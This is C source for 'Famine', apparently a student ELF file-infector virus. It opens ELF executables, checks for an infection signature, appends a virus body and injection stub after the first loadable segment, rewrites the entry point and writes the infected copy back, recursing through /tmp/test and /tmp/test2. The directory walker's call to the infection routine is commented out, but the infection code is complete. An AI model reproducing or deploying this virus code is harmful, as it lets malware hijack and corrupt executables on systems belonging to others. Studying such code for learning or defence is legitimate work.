#include "famine.h"

int			get_size_needed(t_elf *elf, t_elf *virus_elf)
{
	Elf64_Phdr	*next;
	int		diff;

	//TODO: gérer si pas de next (aka inject.o -> inject SGF)
	next = elf->pt_load + 1;
	diff = ((virus_elf->size + INJECT_SIZE) - (next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz)));
	return (diff);
}

void	add_injection(void **dst, t_elf *elf, uint64_t offset_inject, uint64_t entry_infect)
{

	ft_memcpy(*dst, INJECT, INJECT_SIZE - (sizeof(uint64_t) * 4));
	*dst += INJECT_SIZE - (sizeof(uint64_t) * 4);
	ft_memcpy(*dst + sizeof(uint64_t) * 0, &elf->pt_load->p_vaddr, sizeof(uint64_t));
	ft_memcpy(*dst + sizeof(uint64_t) * 1, &offset_inject, sizeof(uint64_t));
	ft_memcpy(*dst + sizeof(uint64_t) * 2, &elf->header->e_entry, sizeof(uint64_t));
	ft_memcpy(*dst + sizeof(uint64_t) * 3, &entry_infect, sizeof(uint64_t));
	*dst += sizeof(uint64_t) * 4;
}

void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
{
	uint64_t	new_entry;
	uint64_t	entry_infect;
	void		*src;
	void		*end;

	src = elf->addr;
	end = src + elf->size;
	ft_memcpy(dst, src, (unsigned long)&elf->header->e_entry - (unsigned long)src);
	dst += (unsigned long)&elf->header->e_entry - (unsigned long)src;
	src = &elf->header->e_entry;
	new_entry = elf->pt_load->p_offset + elf->pt_load->p_filesz + virus_elf->size;
	entry_infect = elf->pt_load->p_offset + elf->pt_load->p_filesz + (virus_elf->header->e_entry - virus_elf->pt_load->p_vaddr);
	ft_memcpy(dst, &new_entry, sizeof(elf->header->e_entry));
	dst += sizeof(elf->header->e_entry);
	src += sizeof(elf->header->e_entry);
	src = add_padding_segments(elf, virus_elf, src, &dst, nb_zero);
	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
	ft_memcpy(dst, src, pt_load_size_left);
	dst += pt_load_size_left;
	src += pt_load_size_left;
	ft_memcpy(dst, virus_elf->addr, virus_elf->size);
	dst += virus_elf->size;
	add_injection(&dst, elf, new_entry, entry_infect);
	ft_memset(dst, 0, nb_zero);
	dst += nb_zero;
	// TODO: fix for thin files like inject
	src += (virus_elf->size + INJECT_SIZE) - get_size_needed(elf, virus_elf);
	src = add_padding_sections(elf, virus_elf, src, &dst, nb_zero);
	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
}

void	try_open_file(t_elf *virus_elf, char *path, char *filename)
{
	int				ret;
	int				fd;
	t_elf			elf;
	void			*header[64];
	char			file[ft_strlen(path) + ft_strlen(filename) + 2];

	ft_strcpy(file, path);
	ft_strcat(file, "/");
	ft_strcat(file, filename);
	fd = __open(file, O_RDWR);
	if (fd > 0)
	{
		ret = read(fd, header, 64);
		if (ret >= 0)
		{
			ret = check_magic_elf(header);
			if (ret == ET_EXEC || ret == ET_DYN)
			{
				ret = 0;
				elf.filename = file;
				elf.size = lseek(fd, (size_t)0, SEEK_END);
				if (elf.size < 0 ||
(elf.addr = __mmap(NULL, elf.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
				{
					__close(fd);
					if (DEBUG)
						debug_print_error(0, virus_elf->filename, file);
					return ;
				}
				if (!memmem(elf.addr, elf.size, SIGNATURE, ft_strlen(SIGNATURE)))
				{
					if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
					{
						__munmap(elf.addr, elf.size);
						__close(fd);
						if (DEBUG)
							debug_print_error(ret, virus_elf->filename, file);
						return ;
					}
					int		size_needed = get_size_needed(&elf, virus_elf);
					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
					if (DEBUG)
					{
						printf("previous size: %ld\n", elf.size);
						printf("size injection: %ld\n", virus_elf->size);
						printf("size_needed: %d\n", size_needed);
						printf("nb_zero_to_add: %d\n", nb_zero_to_add);
						printf("total addition: %d\n", size_needed + nb_zero_to_add);
						printf("final size: %ld\n", elf.size + size_needed + nb_zero_to_add);
					}
					char	*new;
					new = __mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
					if (!new)
					{
						__munmap(elf.addr, elf.size);
						__close(fd);
						if (DEBUG)
							debug_print_error(ret, virus_elf->filename, file);
						return ;
					}
					create_infection(new, &elf, virus_elf, nb_zero_to_add);
					__munmap(elf.addr, elf.size);
					__close(fd);
					fd = __open(file, O_TRUNC | O_WRONLY);
					if (fd < 0)
						return ;
					write(fd, new, elf.size + size_needed + nb_zero_to_add);
					__munmap(new, elf.size + size_needed + nb_zero_to_add);
				}
				else if (DEBUG)
					printf("%s already infected.\n", file);
			}
		}
		else if (DEBUG)
			debug_print_error(ret, virus_elf->filename, file);
		__close(fd);
	}
}

void	print_dirent(t_linux_dirent *linux_dir)
{
	 printf("%8ld  ", linux_dir->d_ino);
	char d_type = *((char *)linux_dir + linux_dir->d_reclen - 1);
	printf("%-10s ", (d_type == DT_REG) ?  "regular" :
					(d_type == DT_DIR) ?  "directory" :
					(d_type == DT_FIFO) ? "FIFO" :
					(d_type == DT_SOCK) ? "socket" :
					(d_type == DT_LNK) ?  "symlink" :
					(d_type == DT_BLK) ?  "block dev" :
					(d_type == DT_CHR) ?  "char dev" : "???");
	printf("%4d %10jd  %s\n", linux_dir->d_reclen,
	(intmax_t) linux_dir->d_off, linux_dir->d_name);

}

void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
{
//	DIR				*dir;
//	struct			dirent *d;
	char			new_path[ft_strlen(path) + ft_strlen(d_name) + 2];
	char			buffer[1024];
	struct stat		statbuf;
	int				fd;

	ft_strcpy(new_path, path);
	if (strlen(d_name))
		ft_strcat(new_path, "/");
	ft_strcat(new_path, d_name);
	stat(new_path, &statbuf);
	if ((statbuf.st_mode & S_IFMT) == S_IFDIR)
	{
		fd =  __open(new_path, O_RDONLY | O_DIRECTORY);
		if (fd > 0)
		{
			int		nread;
			int		rest;
			rest = 0;
			while ((nread = __getdents(fd, (t_linux_dirent *)(buffer + rest), 1024 - rest)) > 0)
			{
				long					bpos;
				t_linux_dirent			*linux_dir;
				printf("==============> %s <================\n", new_path);
				for (bpos = 0; bpos < nread;)
				{
					linux_dir = (void *)buffer + bpos;
					if (ft_strcmp(linux_dir->d_name, ".") && ft_strcmp(linux_dir->d_name, ".."))
						print_dirent(linux_dir);
					if (bpos + linux_dir->d_reclen > nread)
					{
						rest = linux_dir->d_reclen;
						ft_memcpy(buffer, buffer + bpos, 1024 - bpos);
					}
					bpos += linux_dir->d_reclen;
					//else
					//	
				}
				for (bpos = 0; bpos < nread;)
				{
					linux_dir = (void *)buffer + bpos;
					if (ft_strcmp(linux_dir->d_name, ".") && ft_strcmp(linux_dir->d_name, ".."))
						moving_through_path(virus_elf, new_path, linux_dir->d_name);
					bpos += linux_dir->d_reclen;
				}
			}
//			printf("nread %d\n", nread);
		}
		__close(fd);
	}
	else
		printf("%s: %d\n", new_path, statbuf.st_mode);
	/*
	dir = opendir(new_path);
	if (dir)
	{
		while ((d = readdir(dir)))
		{
			if (ft_strcmp(d->d_name, ".") && ft_strcmp(d->d_name, ".."))
			{
				if (d->d_type == DT_DIR)
					moving_through_path(virus_elf, new_path, d->d_name);
				else
					try_open_file(virus_elf, new_path, d->d_name);
			}
		}
		closedir(dir);
	}
	else if (DEBUG)
		debug_print_error(0, virus_elf->filename, path);
	*/
}

int		main(int argc, char *argv[])
{
	int		fd;
	int		ret;
	t_elf	elf;

	ret = 0;
	if (DEBUG)
		debug_print_args(argc, argv);
	fd = __open(argv[0], O_RDONLY);
	if (fd > 0)
	{
		/* TODO: Original infection
			Copy the whole file
		*/
		if (!ft_strcmp(basename(argv[0]), "Famine"))
		{
			elf.filename = argv[0];
			elf.size = lseek(fd, (size_t)0, SEEK_END);
			if (elf.size < 0 ||
	(elf.addr = __mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
			{
				__close(fd);
				if (DEBUG)
					debug_print_error(0, argv[0], argv[0]);
				return (1);
			}
			if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
			{
				__munmap(elf.addr, elf.size);;
				__close(fd);
				if (DEBUG)
					debug_print_error(0, argv[0], argv[0]);
				return (1);
			}
			moving_through_path(&elf, "/tmp/test", "");
			moving_through_path(&elf, "/tmp/test2", "");
			__munmap(elf.addr, elf.size);
			__close(fd);
		}
		else
			printf("Host\n");
		// TODO: Host infection
	}
	else if (DEBUG)
		debug_print_error(0, argv[0], argv[0]);
	__exit(0);
	return (0);
}
